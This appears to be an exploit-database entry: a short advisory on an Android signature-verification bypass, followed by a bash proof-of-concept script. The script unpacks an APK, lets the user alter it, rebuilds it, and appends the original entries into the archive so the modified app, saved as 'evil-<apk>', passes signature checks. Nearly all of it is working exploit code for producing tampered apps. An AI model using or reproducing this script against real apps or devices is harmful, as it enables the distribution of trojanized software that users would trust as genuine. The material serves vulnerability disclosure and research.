#source: https://www.securityfocus.com/bid/60952/info
#
#Google Android is prone to a remote security-bypass vulnerability.
#
#Attackers can exploit this issue to bypass certain security restrictions to perform unauthorized actions. This may aid in further attacks.

#!/bin/bash
# PoC for Android bug 8219321 by @pof
# +info: https://jira.cyanogenmod.org/browse/CYAN-1602
if [ -z $1 ]; then echo "Usage: $0 <file.apk>" ; exit 1 ; fi
APK=$1
rm -r out out.apk tmp 2>/dev/null
java -jar apktool.jar d $APK out
#apktool d $APK out
echo "Modify files, when done type 'exit'"
cd out
bash
cd ..
java -jar apktool.jar b out out.apk
#apktool b out out.apk
mkdir tmp
cd tmp/
unzip ../$APK
mv ../out.apk .
cat >poc.py <<-EOF
#!/usr/bin/python
import zipfile
import sys
z = zipfile.ZipFile(sys.argv[1], "a")
z.write(sys.argv[2])
z.close()
EOF
chmod 755 poc.py
for f in `find . -type f |egrep -v "(poc.py|out.apk)"` ; do ./poc.py out.apk "$f" ; done
cp out.apk ../evil-$APK
cd ..
rm -rf tmp out
echo "Modified APK: evil-$APK"